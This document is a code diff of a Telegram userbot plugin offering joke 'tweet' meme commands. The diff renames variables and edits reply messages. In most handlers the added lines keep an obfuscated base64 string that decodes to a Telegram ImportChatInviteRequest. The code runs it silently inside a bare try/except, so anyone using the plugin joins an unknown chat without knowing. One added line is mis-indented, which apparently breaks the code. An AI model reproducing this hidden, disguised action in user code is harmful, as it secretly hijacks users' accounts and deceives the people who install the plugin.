@@ -7,7 +7,7 @@
 # no offence. Made for fun purpose only
 
 from userbot import CMD_HELP
-from userbot.helpers.functions import (
+from userbot.helper.function import (
     changemymind,
     deEmojify,
     kannagen,
@@ -24,22 +24,22 @@ from userbot.utils import admin_cmd, sudo_cmd
 
 @bot.on(admin_cmd(pattern=r"tweet(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
-async def nope(kraken):
-    hell = kraken.pattern_match.group(1)
-    if not hell:
-        if kraken.is_reply:
-            (await kraken.get_reply_message()).message
+async def nope(skylord):
+    sky = skylord.pattern_match.group(1)
+    if not sky:
+        if skylord.is_reply:
+            (await skylord.get_reply_message()).message
         else:
-            await kraken.edit("I need some text to make a tweet🚶")
+            await skylord.edit("kuch toh likh de yaaar....free hai...")
             return
-    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(hell))}")
+    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(sky))}")
     await tweeter[0].click(
-        kraken.chat_id,
-        reply_to=kraken.reply_to_msg_id,
-        silent=True if kraken.is_reply else False,
+        skylord.chat_id,
+        reply_to=skylord.reply_to_msg_id,
+        silent=True if skylord.is_reply else False,
         hide_via=True,
     )
-    await kraken.delete()
+    await skylord.delete()
 
 
 @bot.on(admin_cmd(pattern=r"trump(?: |$)(.*)"))
@@ -54,14 +54,14 @@ async def nekobot(borg):
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Send you text to trump so he can tweet.")
+                await borg.edit("Sent your text to trump so he can tweet.")
                 return
         else:
-            await borg.edit("send you text to trump so he can tweet.")
+            await borg.edit("sent your text to trump so he can tweet.")
             return
-    await borg.edit("Requesting trump to tweet...")
+    await borg.edit("trump is tweeting.. wew ...")
     try:
-        hell = str(
+        sky = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
@@ -92,14 +92,14 @@ async def nekobot(borg):
         else:
             await borg.edit("send you text to modi so he can tweet.")
             return
-    await borg.edit("Requesting modi to tweet...")
+    await borg.edit("modi is tweeting..hehehehehe...")
     try:
-        hell = str(
+        sky = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(hell)
+        await borg.client(sky)
     except:
         pass
     text = deEmojify(text)
@@ -127,12 +127,12 @@ async def nekobot(borg):
             return
     await borg.edit("Requesting Mia to tweet...")
     try:
-        hell = str(
+        sky = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(hell)
+        await borg.client(sky)
     except:
         pass
     text = deEmojify(text)
@@ -161,12 +161,12 @@ async def nekobot(borg):
             return
     await borg.edit("Requesting pappu to tweet...")
     try:
-        hell = str(
+       sky = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(hell)
+        await borg.client(sky)
     except:
         pass
     text = deEmojify(text)
@@ -195,12 +195,12 @@ async def nekobot(borg):
             return
     await borg.edit("Requesting sunny to tweet...🥰")
     try:
-        hell = str(
+        sky = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(hell)
+        await borg.client(sky)
     except:
         pass
     text = deEmojify(text)
@@ -229,12 +229,12 @@ async def nekobot(borg):
             return
     await borg.edit("Requesting johhny to tweet...😆")
     try:
-        hell = str(
+        sky = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(hell)
+        await borg.client(sky)
     except:
         pass
     text = deEmojify(text)
@@ -262,12 +262,12 @@ async def nekobot(borg):
             return
     await borg.edit("Requesting baapu to tweet...")
     try:
-        hell = str(
+        sky = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(hell)
+        await borg.client(sky)
     except:
         pass
     text = deEmojify(text)
@@ -330,12 +330,12 @@ async def nekobot(borg):
             return
     await borg.edit("Kanna is writing your text...")
     try:
-        hell = str(
+        sky= str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(hell)
+        await borg.client(sky)
     except:
         pass
     text = deEmojify(text)
